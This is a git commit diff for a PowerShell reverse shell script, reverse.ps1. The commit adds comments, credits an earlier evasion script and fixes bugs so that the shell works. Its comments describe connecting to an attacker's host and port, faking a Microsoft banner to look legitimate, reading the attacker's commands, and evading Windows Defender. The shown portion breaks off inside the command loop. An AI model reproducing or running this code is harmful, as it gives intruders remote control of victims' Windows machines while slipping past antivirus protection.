927215a773eff7dab5a6fe6c1750e32e648030da
thefishua <65060280+thefishua@users.noreply.github.com>
2022-04-06 15:15:48 +1000

    Updated Readability of reverse.ps1
    Added more comments to make the code more readable. Fixed indentation and syntax errors. Accredited Norbert Tihanyin from Abu Dhabi.

--- reverse.ps1
+++ reverse.ps1
@@ -1,3 +1,5 @@
+# Accredited https://github.com/tihanyin/PSSW100AVB/blob/main/ReverseShell_2022_03.ps1
+
 # Powershell script to create reverse shell on windows system 
 # This also voids the windows defender system unlike some other attempts at a reverse shell
 
@@ -6,12 +8,13 @@ $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 # Create a client stream to read and write to the connection
 $I = $c.GetStream();
 # Creating a buffer for the incoming commands from the attacker
-[byte[]]$U = 0..(2-shl15) | %{0};
+[byte[]]$U = 0..65535 | %{0};
 $U = ([text.encoding]::ASCII).getBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved. `n`n")
 # Writing output to client stream 
 $I.Write($U,0,$U.Length)
 # Get location of Path Directory and encode in ASCII
 $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$I.Write($U,0,$U.Length)
 # While the attacker is still sending commands to the targeted computer keep the connection
 while(($k = $I.Read($U, 0, $U.Length)) -ne 0) {
   ;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
